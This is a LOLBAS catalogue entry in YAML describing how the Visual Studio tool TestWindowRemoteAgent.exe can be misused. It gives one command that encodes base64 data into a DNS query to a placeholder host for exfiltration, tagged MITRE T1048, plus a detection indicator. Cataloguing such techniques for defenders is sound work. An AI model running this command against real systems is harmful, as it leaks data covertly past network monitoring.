<!-- source: https://github.com/LOLBAS-Project/LOLBAS/blob/a2784c79091cb282fefb68f0056a853cfafd7e3c/yml/OtherMSBinaries/Testwindowremoteagent.yml -->
---
Name: TestWindowRemoteAgent.exe
Description: TestWindowRemoteAgent.exe is the command-line tool to establish RPC
Author: Onat Uzunyayla
Created: 2023-08-21
Commands:
  - Command: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
    Description: Sends DNS query for open connection to any host, enabling exfiltration over DNS
    Usecase: Attackers may utilize this to exfiltrate data over DNS
    Category: Upload
    Privileges: User
    MitreID: T1048
    OperatingSystem: Windows 10, Windows 11
Full_Path:
  - Path: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe
Detection:
  - IOC: TestWindowRemoteAgent.exe spawning unexpectedly
Acknowledgement:
  - Person: Onat Uzunyayla
